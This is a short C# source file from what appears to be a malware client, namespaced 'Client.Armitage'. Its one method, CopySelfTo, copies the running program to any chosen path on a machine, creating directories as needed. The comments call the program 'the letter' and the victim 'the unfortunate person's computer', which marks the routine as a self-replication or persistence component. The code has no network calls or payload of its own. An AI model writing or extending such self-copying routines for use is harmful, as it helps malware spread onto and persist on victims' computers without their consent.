using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Armitage
{
    /// <summary>
    /// A helper class for copying the letter to any location to the unfortunate person's computer.
    /// </summary>
    public static class Copy
    {
        /// <summary>
        /// Copies the current letter to somewhere else.
        /// </summary>
        /// <param name="target">The target directory, including the letter's new filename.</param>
        /// <param name="create_dir">True to create the directory if it does'nt exist.</param>
        /// <returns>Bool if succeeded.</returns>
        public static bool CopySelfTo(string target, bool create_dir = true)
        {
            try
            {
                string parentdir = Path.GetDirectoryName(target);

                if (create_dir && !Directory.Exists(parentdir))
                    Directory.CreateDirectory(parentdir);

                File.Copy(Constants.MyPath, target, true);
                return File.Exists(target);
            }
            catch
            {
                return false;
            }
        }
    }
}
